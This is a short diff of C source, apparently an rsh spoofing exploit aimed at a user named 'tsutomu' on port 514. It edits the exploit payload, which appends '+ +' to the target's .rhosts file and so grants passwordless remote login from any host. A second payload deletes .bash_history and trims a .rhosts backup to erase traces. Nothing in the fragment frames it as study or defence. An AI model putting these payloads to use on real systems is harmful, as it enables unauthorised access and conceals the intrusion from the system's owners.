@@ -15,8 +15,8 @@
 #define SNIFFIP "172.16.45.5"
 #define SRCPORT 514
 #define DSTPORT 514
-#define EXPLOIT "0\0tsutomu\0tsutomu\0echo -e '\n+ +' >> .rhosts\0"
-#define EXPLOITLEN 42
+#define EXPLOIT "0\0tsutomu\0tsutomu\0echo -e '\n+ +' >> .rhosts"
+#define EXPLOITLEN 41
 #define CLEAN "0\0tsutomu\0tsutomu\0rm .bash_history ; sed -i '$ d' .rhosts.back"
 #define CLEANLEN 63
 
